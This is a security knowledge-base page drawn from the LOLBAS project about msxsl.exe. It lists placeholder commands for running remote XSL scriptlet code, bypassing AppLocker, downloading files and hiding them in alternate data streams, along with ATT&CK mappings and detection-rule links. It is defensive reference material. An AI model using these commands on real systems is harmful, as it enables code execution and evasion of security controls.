---
title: "msxsl.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Msxsl.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "msxsl.exe"
functions:
  - "Execute"
  - "AWL Bypass"
  - "Download"
  - "ADS"
attack_technique_ids:
  - "T1220"
  - "T1105"
  - "T1564"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# msxsl.exe

Command line utility used to perform XSL transformations.

## Metadata

- Category: OtherMSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OtherMSBinaries/Msxsl.yml

## Paths

- `no default`

## Commands

### 1. Execute

Run COM Scriptlet code within the script.xsl file (local).

```cmd
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

- Use Case: Local execution of script stored in XSL file.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]

### 2. AWL Bypass

Run COM Scriptlet code within the script.xsl file (local).

```cmd
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

- Use Case: Local execution of script stored in XSL file.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]

### 3. Execute

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
```

- Use Case: Local execution of remote script stored in XSL script stored as an XML file.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]

### 4. AWL Bypass

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
```

- Use Case: Local execution of remote script stored in XSL script stored as an XML file.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]

### 5. Download

Using remote XML and XSL files, save the transformed XML file to disk.

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
```

- Use Case: Download a file from the internet and save it to disk.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 6. ADS

Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
```

- Use Case: Download a file from the internet and save it to an NTFS Alternate Data Stream.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml

## Resources

- {'Link': 'https://twitter.com/subTee/status/877616321747271680'}
- {'Link': 'https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker'}
- {'Link': 'https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Ronnie Salomonsen', 'Handle': '@r0ns3n'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml)
